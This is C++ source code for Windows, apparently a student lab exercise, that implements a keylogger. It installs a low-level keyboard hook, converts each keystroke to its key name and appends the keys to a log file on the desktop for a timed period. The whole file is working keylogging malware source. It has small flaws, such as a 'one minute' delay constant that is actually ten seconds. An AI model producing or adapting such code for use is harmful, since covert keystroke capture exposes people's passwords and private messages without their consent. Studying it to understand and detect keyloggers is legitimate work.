#define no_init_all
#include <iostream>
#include <Windows.h>

#define PATH	L"C:\\Users\\student\\Desktop\\dump.log"
#define DELAY_1MIN	10000
int counter;
HHOOK hHook;
FILE *output;

LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	LPKBDLLHOOKSTRUCT kInfo = (LPKBDLLHOOKSTRUCT)lParam;
	// GetKLeyNameText argument 0 requires a 64 bit value containing the scan code and flags;
	// We need to shift these two values in the high-order part, plus 1 to avoid negative values
	int msg = 1 + (kInfo->scanCode << 16) + (kInfo->flags << 24);
	DWORD vkCode = kInfo->vkCode;
	wchar_t keyName[64];
	GetKeyNameTextW((LONG)msg, keyName, sizeof keyName);

	switch (wParam)
	{
		case WM_KEYDOWN:
			fwprintf_s(output, keyName);
			std::wcout << "Captured: " << keyName << std::endl;
			break;
	}

	return CallNextHookEx(hHook, nCode, wParam, lParam);
}

int main()
{
	errno_t err = _wfopen_s(&output, PATH, L"a");
	if (err != 0)
	{
		printf("Error opening file: %d\n", GetLastError());
		return 0;
	}

	// 1. keylogging operations
	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, NULL, 0);

	DWORD endTime = GetTickCount() + (DELAY_1MIN);

	MSG msg;
	while (GetTickCount() <= endTime)
	{
		// Check for keyboard messages
		while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	printf("bye bye :)\n");
	UnhookWindowsHookEx(hHook);
	return 0;
}
